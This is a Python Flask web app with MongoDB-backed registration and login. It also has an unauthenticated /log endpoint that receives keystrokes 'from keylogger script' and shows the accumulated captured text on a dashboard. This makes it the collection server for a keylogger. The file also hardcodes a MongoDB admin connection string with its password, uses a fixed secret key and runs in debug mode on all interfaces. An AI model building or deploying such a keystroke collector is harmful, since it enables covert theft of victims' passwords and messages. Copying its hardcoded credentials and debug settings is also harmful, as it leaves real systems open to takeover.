from flask import Flask, render_template, request, redirect, url_for, session
from pymongo import MongoClient
import bcrypt
import requests

app = Flask(__name__)
app.secret_key = "testing"

#Here you can use your local mongoDB connection also
#we can use Here
# MongoDB connections
def MongoDB():
    client = MongoClient("mongodb+srv://admin:Vijeth1234@cluster0.hso09.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
    db = client.get_database('total_records')
    records = db.register
    return records

records = MongoDB()

# Global variable to hold the typed text
typed_text = ''

# Home / Registration route
@app.route("/", methods=['GET', 'POST'])
def index():
    message = ''
    if "email" in session:
        return redirect(url_for("logged_in"))
    
    if request.method == "POST":
        user = request.form.get("fullname")
        email = request.form.get("email")
        password1 = request.form.get("password1")
        password2 = request.form.get("password2")

        user_found = records.find_one({"name": user})
        email_found = records.find_one({"email": email})

        if user_found:
            message = 'User with this name already exists.'
            return render_template('index.html', message=message)
        if email_found:
            message = 'This email already exists in the database.'
            return render_template('index.html', message=message)
        if password1 != password2:
            message = 'Passwords should match!'
            return render_template('index.html', message=message)
        else:
            hashed = bcrypt.hashpw(password2.encode('utf-8'), bcrypt.gensalt())
            user_input = {'name': user, 'email': email, 'password': hashed}
            records.insert_one(user_input)
            return redirect(url_for('login'))

    return render_template('index.html')

# Login route
@app.route("/login", methods=["POST", "GET"])
def login():
    message = 'Please login to your account'
    if "email" in session:
        return redirect(url_for("logged_in"))

    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        email_found = records.find_one({"email": email})
        
        if email_found:
            passwordcheck = email_found['password']
            if bcrypt.checkpw(password.encode('utf-8'), passwordcheck):
                session["email"] = email
                return redirect(url_for("logged_in"))
            else:
                message = 'Wrong password'
        else:
            message = 'Email not found'

    return render_template('login.html', message=message)

# Route after successful login
@app.route('/logged_in')
def logged_in():
    if "email" in session:
        email = session["email"]
        return render_template('logged_in.html', email=email)
    return redirect(url_for("login"))

# Route to display the dashboard
@app.route('/dashboard')
def dashboard():
    global typed_text
    if "email" in session:
        return render_template('dashboard.html', typed_text=typed_text)
    return redirect(url_for("login"))

# Logout route to display the signout page
@app.route("/logout", methods=["POST", "GET"])
def logout():
    session.pop("email", None)
    return render_template("signout.html")

# Route to log keystrokes from keylogger script
@app.route('/log', methods=['POST'])
def log_keypress():
    global typed_text
    data = request.json
    key = data.get('key', '')

    if key == 'BACKSPACE':
        typed_text = typed_text[:-1] if typed_text else typed_text
    else:
        typed_text += key
    return '', 200

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=5000)
